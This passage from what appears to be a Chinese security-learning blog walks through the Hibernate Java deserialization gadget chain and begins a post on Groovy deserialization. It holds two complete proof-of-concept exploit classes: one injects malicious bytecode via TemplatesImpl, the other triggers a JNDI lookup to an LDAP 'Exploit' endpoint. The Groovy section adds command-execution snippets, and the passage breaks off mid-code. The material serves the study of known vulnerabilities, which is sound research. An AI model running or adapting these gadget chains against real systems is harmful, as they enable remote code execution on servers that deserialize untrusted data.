alt="image-20240314183647213"></p><p>这里就继续找谁调用了<code>getPropertyValues</code>，并且这里<code>AbstractComponentTuplizer</code>由于是抽象类，我们先找他的实现类</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314184008593.png" alt="image-20240314184008593"></p><p>这里选择<code>PojoComponentTuplizer</code>，它会调用父类的<code>getPropertyValues</code></p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314184737326.png" alt="image-20240314184737326"></p><p>继续找谁调用了<code>PojoComponentTuplizer</code>的<code>getPropertyValues</code></p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314185832459.png" alt="image-20240314185832459"></p><p>找到<code>ComponentType</code></p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314185900606.png" alt="image-20240314185900606"></p><p>然后参考的文章说该类的<code>getHashCode</code>会调用<code>getPropertyValue</code></p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190048959.png" alt="image-20240314190048959"></p><h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><p>两个参考文章都说到这里，但是我们可以发现上面两张图调用的函数很明显不一样</p><p>一个是</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190339428.png" alt="image-20240314190339428"></p><p>一个是</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190400090.png" alt="image-20240314190400090"></p><p>我根据poc调试后发现走的是<code>getPropertyValue</code>，并且下一步直接走到了</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314190652314.png" alt="image-20240314190652314"></p><p>所以我的想法是<code>componentTuplizer</code>设置为<code>PojoComponentTuplizer</code>后，由于没有<code>getPropertyValue</code>方法，于是调用了父类的<code>getPropertyValue</code>，即<code>AbstractComponentTuplizer</code></p><p>感觉这个解释其实也有问题，但是我的能力只能想到这些</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>继续找如何接上<code>getHashCode</code></p><p>找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用getHashcode了的</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314191824703.png" alt="image-20240314191824703"></p><p>TypedValue 初始化时，除了赋值 type、value 操作外，还调用了 <code>initTransients</code> 方法对 hashcode 属性进行了初始化</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193159860.png" alt="image-20240314193159860"></p><p>初始化时新创建了一个 ValueHolder 对象，并为其赋予了一个新的 DeferredInitializer 对象并重写了 <code>initialize()</code> 方法</p><p>我们首先发现 TypedValue 的 <code>hashCode()</code> 方法调用了成员变量 <code>hashcode.getValue()</code> 方法，这个方法又会调用 DeferredInitializer 的 <code>initialize()</code> 方法，就是之前我们初始化的那个</p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193246189.png" alt="image-20240314193246189"></p><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193257977.png" alt="image-20240314193257977"></p><p>这里也有点不理解是如何调用进去的</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>总而言之调用到hashCode函数即可，那很明显就是HashMap作入口</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>即使知道了大概的调用顺序，想要写出poc也不是容易的事</p><div class="code-wrapper"><pre><code class="hljs reasonml">package hibernate;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.hibernate.engine.spi.TypedValue;import org.hibernate.<span class="hljs-keyword">type</span>.Type;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Hello world!</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span>public <span class="hljs-keyword">class</span> Hibernate1 &#123;    public static String fileName = <span class="hljs-string">&quot;Hibernate1.bin&quot;</span>;    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        Class&lt;?&gt; componentTypeClass             = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.type.ComponentType&quot;</span>)</span>;        Class&lt;?&gt; pojoComponentTuplizerClass     = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>)</span>;        Class&lt;?&gt; abstractComponentTuplizerClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>)</span>;        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span>        TemplatesImpl tmpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tmpl</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tmpl</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tmpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);        Method  <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;getOutputProperties&quot;</span>)</span>;        Object getter;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>            Class&lt;?&gt;getterImpl  = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>)</span>;            Constructor&lt;?&gt; constructor = getterImpl.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">method</span>)</span>;        &#125; catch (Exception ignored) &#123;            <span class="hljs-comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>            Class&lt;?&gt;       basicGetter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>)</span>;            Constructor&lt;?&gt; constructor = basicGetter.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>, Method.<span class="hljs-params">class</span>, String.<span class="hljs-params">class</span>)</span>;            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">tmpl</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-keyword">method</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);        &#125;        <span class="hljs-comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span>        Object tuplizer = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">pojoComponentTuplizerClass</span>)</span>;        <span class="hljs-comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span>        Field field = abstractComponentTuplizerClass.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;getters&quot;</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object getters = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">getter</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-number">1</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(getters, <span class="hljs-number">0</span>, getter);        field.set(tuplizer, getters);        <span class="hljs-comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span>        Object <span class="hljs-keyword">type</span> = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">componentTypeClass</span>)</span>;        <span class="hljs-comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;componentTuplizer&quot;</span>,<span class="hljs-params">tuplizer</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertySpan&quot;</span>,1)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertyTypes&quot;</span>,<span class="hljs-params">new</span> Type[]&#123;(Type)</span> <span class="hljs-keyword">type</span>&#125;);        <span class="hljs-comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span>        TypedValue typedValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TypedValue((Type)</span> <span class="hljs-keyword">type</span>, null);        <span class="hljs-comment">// 创建反序列化用 HashMap</span>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        hashMap.put(typedValue, <span class="hljs-string">&quot;su18&quot;</span>);        <span class="hljs-comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">typedValue</span>,<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-params">tmpl</span>)</span>;        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">hashMap</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(barr);        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">new</span> ByteArrayInputStream(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>));        Object o = (Object)ois.read<span class="hljs-constructor">Object()</span>;    &#125;&#125;</code></pre></div><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p><img src="/../images/Hibernate%E5%88%A9%E7%94%A8%E9%93%BE/image-20240314193649136.png" alt="image-20240314193649136"></p><h2 id="GetterMethodImpl"><a href="#GetterMethodImpl" class="headerlink" title="GetterMethodImpl"></a>GetterMethodImpl</h2><p>在 Hibernate 5.x 里，实现了 <code>org.hibernate.property.access.spi.GetterMethodImpl</code> 类，这个类能够替代 <code>BasicPropertyAccessor$BasicGetter.get()</code> 来调用 getter 方法。</p><h2 id="Hibernate-2"><a href="#Hibernate-2" class="headerlink" title="Hibernate 2"></a>Hibernate 2</h2><p>。。。。其实就是把<code>Templates</code>改为<code>JdbcRowSetImpl</code></p><div class="code-wrapper"><pre><code class="hljs reasonml">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.rowset.JdbcRowSetImpl;import javassist.ClassPool;import org.hibernate.engine.spi.TypedValue;import org.hibernate.<span class="hljs-keyword">type</span>.Type;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.util.HashMap;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Hello world!</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span>public <span class="hljs-keyword">class</span> Hibernate2 &#123;    public static String fileName = <span class="hljs-string">&quot;Hibernate1.bin&quot;</span>;    public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        field.set(obj, value);    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        Class&lt;?&gt; componentTypeClass             = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.type.ComponentType&quot;</span>)</span>;        Class&lt;?&gt; pojoComponentTuplizerClass     = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>)</span>;        Class&lt;?&gt; abstractComponentTuplizerClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>)</span>;        <span class="hljs-comment">// 生成JdbcRowxxx</span>        JdbcRowSetImpl rs = <span class="hljs-keyword">new</span> <span class="hljs-constructor">JdbcRowSetImpl()</span>;        rs.set<span class="hljs-constructor">DataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:9999/Exploit&quot;</span>)</span>;        Method <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JdbcRowSetImpl</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;getDatabaseMetaData&quot;</span>)</span>;        Object getter;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>            Class&lt;?&gt;       getterImpl  = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>)</span>;            Constructor&lt;?&gt; constructor = getterImpl.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">null</span>, <span class="hljs-params">null</span>, <span class="hljs-params">method</span>)</span>;        &#125; catch (Exception ignored) &#123;            <span class="hljs-comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span>            Class&lt;?&gt;       basicGetter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>)</span>;            Constructor&lt;?&gt; constructor = basicGetter.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>, Method.<span class="hljs-params">class</span>, String.<span class="hljs-params">class</span>)</span>;            constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;            getter = constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">rs</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-keyword">method</span>, <span class="hljs-string">&quot;databaseMetaData&quot;</span>);        &#125;        <span class="hljs-comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span>        Object tuplizer = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">pojoComponentTuplizerClass</span>)</span>;        <span class="hljs-comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span>        Field field = abstractComponentTuplizerClass.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;getters&quot;</span>)</span>;        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object getters = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">getter</span>.<span class="hljs-params">getClass</span>()</span>, <span class="hljs-number">1</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(getters, <span class="hljs-number">0</span>, getter);        field.set(tuplizer, getters);        <span class="hljs-comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span>        Object <span class="hljs-keyword">type</span> = create<span class="hljs-constructor">WithoutConstructor(<span class="hljs-params">componentTypeClass</span>)</span>;        <span class="hljs-comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;componentTuplizer&quot;</span>,<span class="hljs-params">tuplizer</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertySpan&quot;</span>,1)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">type</span>,<span class="hljs-string">&quot;propertyTypes&quot;</span>,<span class="hljs-params">new</span> Type[]&#123;(Type)</span> <span class="hljs-keyword">type</span>&#125;);        <span class="hljs-comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span>        TypedValue typedValue = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TypedValue((Type)</span> <span class="hljs-keyword">type</span>, null);        <span class="hljs-comment">// 创建反序列化用 HashMap</span>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;        hashMap.put(typedValue, <span class="hljs-string">&quot;su18&quot;</span>);        <span class="hljs-comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">typedValue</span>,<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-params">rs</span>)</span>;        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">hashMap</span>)</span>;        oos.close<span class="hljs-literal">()</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(barr);        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">new</span> ByteArrayInputStream(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>));        Object o = (Object)ois.read<span class="hljs-constructor">Object()</span>;    &#125;&#125;</code></pre></div><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>其实还是有好多不理解的地方，唉。。。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://su18.org/post/ysoserial-su18-3/">https://su18.org/post/ysoserial-su18-3/</a></p><p><a href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>groovy反序列化</title>
    <link href="/2024/03/07/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/03/07/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不知道是不是脑子烧糊涂了，不理解</p><p>纯复现Boogipop大佬的操作</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;dependency&gt;</span><span class="hljs-section">&lt;groupId&gt;</span><span class="hljs-attribute">org</span>.codehaus.groovy&lt;/groupId&gt;<span class="hljs-section">&lt;artifactId&gt;</span><span class="hljs-attribute">groovy</span>-<span class="hljs-literal">all</span>&lt;/artifactId&gt;<span class="hljs-section">&lt;version&gt;</span><span class="hljs-attribute">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">3</span>&lt;/version&gt;<span class="hljs-section">&lt;/dependency&gt;</span></code></pre></div><h2 id="Groovy命令执行"><a href="#Groovy命令执行" class="headerlink" title="Groovy命令执行"></a>Groovy命令执行</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;<span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;<span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.FileOutputStream;<span class="hljs-keyword">import</span> java.io.ObjectInputStream;<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.lang.annotation.Target;<span class="hljs-keyword">import</span> java.lang.reflect.*;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException &#123;        <span class="hljs-type">MethodClosure</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="hljs-string">&quot;exec&quot;</span>);        <span class="hljs-type">Method</span> <span class="hljs-variable">doCall</span> <span class="hljs-operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="hljs-string">&quot;doCall&quot;</span>, Object.class);        doCall.setAccessible(<span class="hljs-literal">true</span>);        doCall.invoke(exec,<span class="hljs-string">&quot;calc&quot;</span>);    &#125;&#125;</code></pre></div><p><img src="/../images/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240307221715865.png" alt="image-20240307221715865"></p><p><img src="/../images/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240307221654763.png" alt="image-20240307221654763"></p><h2 id="String-execute"><a href="#String-execute" class="headerlink" title="String.execute()"></a>String.execute()</h2><p>Groovy为String对象封装了一个execute方法用来动态执行命令</p><p><img src="/../images/groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240307221922462.png" alt="image-20240307221922462"></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example<span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure<span class="hljs-keyword">import</span> java.lang.reflect.Method<span class="hljs-keyword">class</span> <span class="hljs-title class_">Groovy</span> &#123;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        println(<span class="hljs-string">&quot;whoami&quot;</span>.execute().text);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs dart"><span class="hljs-comment">// 直接命令执行</span>Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<span class="hljs-string">&quot;calc&quot;</span>.execute()<span class="hljs-string">&#x27;calc&#x27;</span>.execute()<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;<span class="hljs-string">&quot;calc&quot;</span>.execute()&#125;</span>&quot;</span><span class="hljs-string">&quot;<span class="hljs-subst">$&#123;<span 